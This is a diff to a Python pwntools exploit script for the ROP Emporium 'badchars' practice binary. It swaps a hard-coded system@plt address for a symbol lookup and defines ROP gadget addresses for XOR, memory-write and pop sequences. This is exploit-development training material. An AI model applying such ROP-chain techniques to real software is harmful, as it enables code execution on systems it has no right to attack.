@@ -105,8 +105,7 @@ conversions:
 e = ELF("./badchars")
 
 
-call_system = 0x00000000004006f0 #system@plt - TODO: somehow we cannot use the call function directly, but we have to use the address system@plt -> find out why
-#call_system = e.symbols["usefulFunction"]+9  # usefulFunction +  9 -- call   0x4006f0 <system@plt
+call_system = e.symbols["plt.system"]
 xor_byte_r15 = e.symbols["usefulGadgets"]+0 # usefulGadgets + 0 -- xor BYTE PTR [r15],r14b; ret
 mov_r13_r12 = e.symbols["usefulGadgets"]+4# usefulGadgets + 4 -- mov    QWORD PTR [r13+0x0],r12; ret
 pop_r12_r13 = e.symbols["usefulGadgets"]+11 # usefulGadgets + 11 -- pop r12; pop r13; ret
